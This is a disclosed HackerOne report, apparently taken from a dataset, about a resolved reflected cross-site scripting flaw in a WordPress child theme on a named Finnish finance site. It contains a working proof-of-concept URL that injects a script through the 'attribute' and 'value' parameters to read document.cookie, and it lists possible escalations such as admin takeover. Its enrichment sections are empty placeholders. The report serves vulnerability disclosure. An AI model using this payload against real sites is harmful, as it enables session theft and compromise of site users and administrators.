---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '335735'
original_report_id: '335735'
title: Reflected XSS of bbe-child-starter Theme via "value"-GET-parameter
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: localtapiola
created_at: '2018-04-11T07:29:34.039Z'
disclosed_at: '2018-12-05T08:07:56.849Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 11
asset_identifier: www.lahitapiolarahoitus.fi
asset_type: URL
max_severity: none
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected XSS of bbe-child-starter Theme via "value"-GET-parameter

## Metadata

- HackerOne Report ID: 335735
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: localtapiola
- Disclosed At: 2018-12-05T08:07:56.849Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

This bug is related to #324442. And xss in other url.


poc:
```
https://www.lahitapiolarahoitus.fi/wp-content/themes/bbe-child-starter/bbe-engine/assets/actions/bbe_open_htmleditor_popup.php?attribute=%27%3C/script%3E%3Cbody%20onload&value=alert(document.cookie)
```

## Impact

-Make admin-user run malicious javascript which will then be used to access other WP-Admin functionalities --> Remote code execution --> Possibly piivoting to other hosts.
-Make other users run malicious javascript.
-Show spoofed content which can be used in social engineering attacks (such as fake login pages, fake invoices, face contact details, fake announcements etc.).

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
